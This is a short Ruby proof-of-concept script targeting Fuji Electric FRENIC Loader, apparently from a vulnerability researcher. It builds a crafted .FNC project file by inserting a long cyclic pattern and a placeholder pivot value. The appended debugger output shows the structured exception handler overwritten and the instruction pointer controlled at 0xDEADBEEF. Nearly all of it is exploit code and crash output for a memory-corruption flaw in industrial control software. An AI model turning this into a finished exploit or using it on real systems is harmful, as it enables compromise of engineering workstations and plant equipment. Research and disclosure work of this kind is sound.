#!/usr/bin/env ruby
# Fuji Electric FRENIC Loader3.3
# Test against FRENIC Loader 7.3.3.1 E
require 'rex'

fd = File.open("template.FNC", "rb" )
new_eve = fd.read(fd.stat.size)
fd.close

data = Rex::Text.pattern_create(150000)

fuzz = new_eve

pivot = [0xDEADBEEF].pack('V')

x = File.new("fuzz.FNC","wb")
x.write(fuzz.gsub(/FUZZER/, data).gsub(/PIVT/, pivot.to_s))
x.close
__END__
(ef4.d60): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=2d202020 ecx=ffffffff edx=0012e820 esi=00000000 edi=00000001
eip=0d30202c esp=0012e8b4 ebp=2d202c30 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
0d30202c ??              ???
0:000> !exchain
0012eaa0: deadbeef
Invalid exception stack at 44454546
0:000> g
(ef4.d60): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=deadbeef edx=771171cd esi=00000000 edi=00000000
eip=deadbeef esp=0012e358 ebp=0012e378 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
deadbeef ??              ???
_
